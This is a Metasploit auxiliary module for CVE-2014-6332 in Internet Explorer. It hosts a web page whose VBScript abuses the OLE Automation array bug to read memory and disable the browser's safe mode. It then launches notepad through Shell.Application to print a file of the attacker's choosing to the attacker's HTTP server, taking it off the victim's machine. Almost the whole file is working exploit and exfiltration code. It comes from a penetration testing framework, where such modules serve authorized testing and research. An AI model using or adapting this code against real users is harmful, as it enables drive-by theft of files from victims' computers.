##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/exploit/powershell'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Microsoft Internet Explorer Windows OLE Automation Array File Stealing",
      'Description'    => %q{
        This module exploits the Windows OLE Automation array vulnerability, CVE-2014-6332.
        The vulnerability affects Internet Explorer 3.0 until version 11 within Windows 95 up to Windows 10.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'sinn3r'
        ],
      'References'     =>
        [
          [ 'CVE', '2014-6332' ],
          [ 'MSB', 'MS14-064' ],
          [ 'OSVDB', '114533' ],
          [ 'EDB', '35229' ],
          [ 'EDB', '35308' ],
          [ 'URL', 'http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows' ],
          [ 'URL', 'https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module' ],
          [ 'URL', 'https://twitter.com/HaifeiLi/status/535839541173555200' ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 13 2014"
      ))

      register_options(
        [
           OptString.new('FILE', [true, 'The file to steal'])
        ], self.class )

  end

  def vbs_prepare
    code = %Q|
dim   aa()
dim   ab()
dim   a0
dim   a1
dim   a2
dim   a3
dim   win9x
dim   intVersion
dim   rnda
dim   funclass
dim   myarray

Begin()

function Begin()
  On Error Resume Next
  info=Navigator.UserAgent

  if(instr(info,"Win64")>0)   then
     exit   function
  end if

  if (instr(info,"MSIE")>0)   then
             intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))
  else
     exit   function

  end if

  win9x=0

  BeginInit()
  If Create()=True Then
     myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
     myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)

     if(intVersion<4) then
         document.write("<br> IE")
         document.write(intVersion)
         runshellcode()
     else
          setnotsafemode()
     end if
  end if
end function

function BeginInit()
   Randomize()
   redim aa(5)
   redim ab(5)
   a0=13+17*rnd(6)
   a3=7+3*rnd(5)
end function

function Create()
  On Error Resume Next
  dim i
  Create=False
  For i = 0 To 400
    If Over()=True Then
    '   document.write(i)
       Create=True
       Exit For
    End If
  Next
end function

sub testaa()
end sub

function mydata()
    On Error Resume Next
     i=testaa
     i=null
     redim  Preserve aa(a2)

     ab(0)=0
     aa(a1)=i
     ab(0)=6.36598737437801E-314

     aa(a1+2)=myarray
     ab(2)=1.74088534731324E-310
     mydata=aa(a1)
     redim  Preserve aa(a0)
end function

function setnotsafemode()
    On Error Resume Next
    i=mydata()
    i=readmemo(i+8)
    i=readmemo(i+16)
    j=readmemo(i+&h134)
    for k=0 to &h60 step 4
        j=readmemo(i+&h120+k)
        if(j=14) then
              j=0
              redim  Preserve aa(a2)
     aa(a1+2)(i+&h11c+k)=ab(4)
              redim  Preserve aa(a0)

     j=0
              j=readmemo(i+&h120+k)

               Exit for
           end if

    next
    ab(2)=1.69759663316747E-313
    runaaaa()
end function

function Over()
    On Error Resume Next
    dim type1,type2,type3
    Over=False
    a0=a0+a3
    a1=a0+2
    a2=a0+&h8000000

    redim  Preserve aa(a0)
    redim   ab(a0)

    redim  Preserve aa(a2)

    type1=1
    ab(0)=1.123456789012345678901234567890
    aa(a0)=10

    If(IsObject(aa(a1-1)) = False) Then
       if(intVersion<4) then
           mem=cint(a0+1)*16
           j=vartype(aa(a1-1))
           if((j=mem+4) or (j*8=mem+8)) then
              if(vartype(aa(a1-1))<>0)  Then
                 If(IsObject(aa(a1)) = False ) Then
                   type1=VarType(aa(a1))
                 end if
              end if
           else
             redim  Preserve aa(a0)
             exit  function

           end if
        else
           if(vartype(aa(a1-1))<>0)  Then
              If(IsObject(aa(a1)) = False ) Then
                  type1=VarType(aa(a1))
              end if
            end if
        end if
    end if


    If(type1=&h2f66) Then
          Over=True
    End If
    If(type1=&hB9AD) Then
          Over=True
          win9x=1
    End If

    redim  Preserve aa(a0)

end function

function ReadMemo(add)
    On Error Resume Next
    redim  Preserve aa(a2)

    ab(0)=0
    aa(a1)=add+4
    ab(0)=1.69759663316747E-313
    ReadMemo=lenb(aa(a1))

    ab(0)=0

    redim  Preserve aa(a0)
end function

    |

  end

  def run
    exploit # Start the HTTP server
  end

  def on_request_uri(cli, req)
    print_status("Sending HTML")
    send_response(cli, get_html)
  end

  def get_html
    %Q|<!doctype html>
<html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<body>
<script language="VBScript">
function runaaaa()
On Error Resume Next

set shell = createobject("Shell.Application")
shell.ShellExecute "notepad.exe", "/PT ""#{datastore['FILE']}"" ""http://#{datastore['SRVHOST'] || Rex::Socket.source_address}:#{datastore['SRVPORT']}/#{get_resource}""", "", "open", 0

end function
</script>
<script language="VBScript">
#{vbs_prepare}
</script>
</body>
</html>
    |

  end

end

